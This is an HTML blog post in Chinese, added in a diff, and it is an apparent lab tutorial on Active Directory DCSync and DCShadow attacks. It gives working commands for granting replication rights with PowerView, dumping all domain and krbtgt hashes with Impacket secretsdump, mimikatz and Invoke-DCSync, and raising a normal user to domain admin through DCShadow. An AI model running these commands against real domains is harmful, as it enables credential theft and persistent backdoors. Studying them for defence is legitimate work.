@@ -1,0 +1,479 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>DCSync - Charmy&#39;s blog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  <meta name="keywords" content=", 权限维持">
+  <meta name="description" content="DCSync原理 域内的数据都会更新的, 不同的域控之...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/180x180.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: false
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '埋下一个梦，待它破土而出。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: false,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: 'myblog/node_modules/hexo-generator-searchdb/templates/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">DCSync</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 随拍</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/blog-pictures/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">DCSync</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>April 12, 2023</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2360</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 域内的数据都会更新的, 不同的域控之间相隔15分钟会同步一次数据</p>
+<p><font color='red'>默认不允许从只读域控中获取数据, 因为只读域控是不能够复制同步数据给其他域控的</font></p>
+<p>DCSync利用目录复制服务</p>
+<p>目录复制服务是用来复制和管理数据的RPC协议</p>
+<p>DCSync利用该协议的GetNCChanges接口向域控发起同步数据请求, 来获得域控的数据</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先我们要知道的是, 不是所有的用户都有DCSync的权限的</p>
+<p>默认这些组的用户有DCSync的权限</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Administrators<br><br><span class="hljs-built_in">Domain</span> Admins<br><br>Enterprise Admins<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="赋予权限"><a href="#赋予权限" class="headerlink" title="赋予权限"></a>赋予权限</h3><p>当然这个权限是可以被给予的</p>
+<p><strong><font color='red'>修改ACE即可</font></strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DS-<span class="hljs-keyword">Replication</span>-<span class="hljs-keyword">Get</span>-Changes<br>可以复制不包括私密域数据的其他数据<br><br>DS-<span class="hljs-keyword">Replication</span>-<span class="hljs-keyword">Get</span>-Changes-<span class="hljs-keyword">All</span><br>可以复制域中任意数据<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323155342305.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230323155342305</span></p>
+<p>输入要给予权限的用户</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323155533805.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230323155533805</span></p>
+<p>最后赋予权限在下面的勾选”复制目录更改”和”复制目录更改所以项”</p>
+<p>还有一种直接了当的方法给予权限</p>
+<p>直接powershell跑脚本 (empire的powerview.ps1脚本)</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1;<br><br><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity &#x27;DC=sayms,DC=local&#x27; -PrincipalIdentity test -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="查找权限"><a href="#查找权限" class="headerlink" title="查找权限"></a>查找权限</h3><p>可以通过工具直接了当的找到用于DCSync权限的用户</p>
+<p>使用AdFind</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">AdFind.exe -s <span class="hljs-keyword">subtree </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=com&quot;</span> -sdna nTSecurityDescriptor -sddl+++ -sddlfilter <span class="hljs-comment">;;; &quot;Replicating Directory Changes&quot;;; -recmute</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用Execute-ACLight2.bat, 直接运行就行</p>
+<p>会生成结果文件</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323211801807.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230323211801807</span></p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>因为原理就是, 模仿域控去请求其他域控统一数据</p>
+<p>直接运行脚本工具就行, 目的就是获取域用户的hash值</p>
+<p><font color='red'>Impacket</font></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">获取所有用户<br>python3 secretsdump.py sayms<span class="hljs-operator">/</span>tom:admin<span class="hljs-variable">@12345</span><span class="hljs-variable">@192</span><span class="hljs-number">.168</span><span class="hljs-number">.8</span><span class="hljs-number">.4</span> <span class="hljs-operator">-</span>just<span class="hljs-operator">-</span>dc<br><br>获取具体用户<br>python3 secretsdump.py sayms<span class="hljs-operator">/</span>tom:admin<span class="hljs-variable">@12345</span><span class="hljs-variable">@192</span><span class="hljs-number">.168</span><span class="hljs-number">.8</span><span class="hljs-number">.4</span> <span class="hljs-operator">-</span>just<span class="hljs-operator">-</span>dc<span class="hljs-operator">-</span><span class="hljs-keyword">user</span> krbtgt<br></code></pre></td></tr></table></figure>
+
+
+
+<p><font color='red'>mimikatz</font></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">获取所有用户<br>lsadump::dcsync /<span class="hljs-keyword">domain</span>:sayms.<span class="hljs-keyword">local</span> /<span class="hljs-keyword">all</span> /csv<br><br>获取具体用户<br>lsadump::dcsync /<span class="hljs-keyword">domain</span>:sayms.<span class="hljs-keyword">local</span> /<span class="hljs-keyword">user</span>:krbtgt<br></code></pre></td></tr></table></figure>
+
+
+
+<p><font color='red'>powershell</font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-DCSync</span>.ps1;<br><br>导出所有<br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span><br><br>导出具体<br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> <span class="hljs-literal">-Users</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;krbtgt&quot;</span>) | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="进行权限维持"><a href="#进行权限维持" class="headerlink" title="进行权限维持"></a>进行权限维持</h2><h3 id="DCSync-1"><a href="#DCSync-1" class="headerlink" title="DCSync"></a>DCSync</h3><p>可以想到, 如果我们拥有域管权限, 就可以任意指定DCSync权限</p>
+<p>为用户添加DCSync权限</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1;<br><br><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity &#x27;DC=sayms,DC=local&#x27; -PrincipalIdentity test -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>清除DCSync权限</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1;<br><br><span class="hljs-keyword">Remove</span>-DomainObjectAc1 -TargetIdentity &#x27;DC=sayms,DC=local&#x27; -PrincipalIdentity test -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>通过上面我们可以知道DCSync是通过模拟域控, 向其他域控请求同步数据, 从而获取信息</p>
+<p>DCShadow就比较骚, 模拟域控, 通过域控直接的数据同步机制, 将自己预先设定的对象注入其他的域控中, 以此来创建后门</p>
+<p><strong>将域普通用户提升为域管</strong></p>
+<p>可以看到aim隶属于普通域用户组</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412214112209.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230412214112209</span></p>
+<p>通过修改其primaryGroupID值, 使其称为域管</p>
+<p>首先在任意一台域主机使用mimikatz, 以system权限运行</p>
+<p>因为想要伪造域控, 是需要高权限的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcshadow /object:CN=Aim,CN=Users,DC=sayms,DC=<span class="hljs-built_in">local</span> /attribute:primaryGroupID /value:512<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412215353168.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230412215353168</span></p>
+<p>在用域管权限打开一个mimikatz窗口</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lsadump:</span>:dcshadow /<span class="hljs-keyword">push</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412215654137.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230412215654137</span></p>
+<p>然后就可以看到aim加入了域管组</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412220711261.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230412220711261</span></p>
+
+      </section>
+      <section class="extra">
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="tag">权限维持</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2023/03/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial/">i春秋Initial靶场<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+<div id="valine"></div>
+<script defer src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  window.onload = function () {
+    var loadValine = function () {
+      new Valine({
+        el: '#valine',
+        app_id: "MolKGIamzoTNkVe0GP3Zbi0H-gzGzoHsz",
+        app_key: "AFgQCxzt4SDNIbcm1yz6eUVc",
+        placeholder: "你好",
+        avatar: "mp",
+        pageSize: "10",
+        lang: "zh-CN",
+      });
+    }
+    if ( true ) {
+      $("#comments-btn").on("click", function () {
+        $(this).hide();
+        loadValine();
+      });
+    } else {
+      loadValine();
+    }
+  };
+</script>
+
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%8B%E4%BA%88%E6%9D%83%E9%99%90"><span class="toc-text">赋予权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%9D%83%E9%99%90"><span class="toc-text">查找权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync-1"><span class="toc-text">DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCShadow"><span class="toc-text">DCShadow</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="https://github.com/lcharmy "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:lcharmy@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
